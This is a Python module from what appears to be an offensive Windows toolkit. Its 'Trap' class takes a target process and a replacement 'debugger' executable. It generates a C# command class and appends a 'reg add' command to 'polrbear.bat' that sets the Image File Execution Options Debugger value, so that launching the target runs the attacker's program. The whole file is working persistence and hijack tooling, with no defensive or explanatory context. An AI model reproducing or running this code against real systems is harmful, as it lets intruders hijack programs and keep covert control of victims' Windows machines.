from classes.options import Options
from conf.strings import *
from pathlib import Path

class Trap(Options):
    """ Primary Trap Class """
    def __init__(self):
        self.options = {}
        self.add_option('PROCESS', '', True, 'The process to trap')
        self.add_option('DEBUGGER', '', True, 'The debugger process to run')
        self.hkpath = 'hklm\\software\\microsoft\\windows nt\\currentversion\\image file execution options\\'

    def code(self):
        return str(write_line % ('""'))

    def create_class(self, cmd):       
        cmdcls = cmd.create_class()
        cp = Path('./mono/none/Commands/')
        fn = '%s.cs' % cmd.name        
        cf = cp / fn
        msg = 'Creating the %s class for the none.exe binary' % fn
        print(status_info % msg)
        with cf.open('w', encoding='utf-8') as f:
            f.write(cmdcls)
        print(status_okay % 'Class created successfully')

        self.show_bat_info()

    def show_bat_info(self):
        regcmd = 'reg add "' + self.hkpath + self.options['PROCESS']['value'] + '" /v Debugger /t REG_SZ /d "' + self.options['DEBUGGER']['value'] + '" /f'
        cp = Path('.')
        fn = 'polrbear.bat'
        cf = cp / fn
        with cf.open('a', encoding='utf-8') as f:
            f.write(regcmd + '\n')                
        print(status_okay % 'Added the following command to polrbear.bat')
        print(bcolors.YELLOW + regcmd + bcolors.END)
